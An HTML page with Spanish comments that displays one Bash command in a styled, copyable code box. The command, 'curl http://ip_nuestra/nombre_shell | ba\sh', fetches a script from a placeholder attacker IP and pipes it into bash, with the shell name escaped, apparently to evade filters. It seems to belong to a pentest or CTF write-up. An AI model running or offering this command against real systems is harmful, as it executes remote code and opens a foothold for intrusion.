<!DOCTYPE html>
<html lang="en">
<head>
  <!-- Incluir el CSS de Prism.js para resaltado de sintaxis -->
  <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet" />

  <style>
    /* Estilo para el contenedor principal */
    .code-container {
      display: inline-block;
      text-align: left;
      margin-top: 20px;
      border: 1px solid #ddd;
      border-radius: 8px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      overflow: hidden;
      width: auto;
    }

    /* Estilo para el encabezado del código */
    .code-header {
      background-color: #2d2d2d;
      color: #ffffff;
      padding: 10px 15px;
      font-size: 14px;
      font-weight: bold;
      border-bottom: 1px solid #ddd;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    /* Estilo para el bloque de código */
    pre {
      margin: 0;
      padding: 15px;
      background-color: #1e1e1e;
      color: #f8f8f2;
      border-radius: 0 0 8px 8px;
      font-size: 14px;
      overflow-x: auto;
    }

    /* Estilos para el botón de copiar */
    .copy-button {
      background-color: #4CAF50;
      color: white;
      padding: 5px 10px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 14px;
    }

    .copy-button:hover {
      background-color: #45a049;
    }
  </style>
</head>
<body>

  <!-- Contenedor del código -->
  <div class="code-container">
    <div class="code-header">
      Bash
      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
    </div>
    <pre><code class="language-bash">curl http://ip_nuestra/nombre_shell | ba\sh</code></pre>
  </div>

  <!-- Incluir el script de Prism.js -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>

  <script>
    function copyToClipboard() {
      const code = document.querySelector('.code-container code').innerText;
      navigator.clipboard.writeText(code).then(() => {
        alert("Código copiado al portapapeles!");
      });
    }
  </script>

</body>
</html>
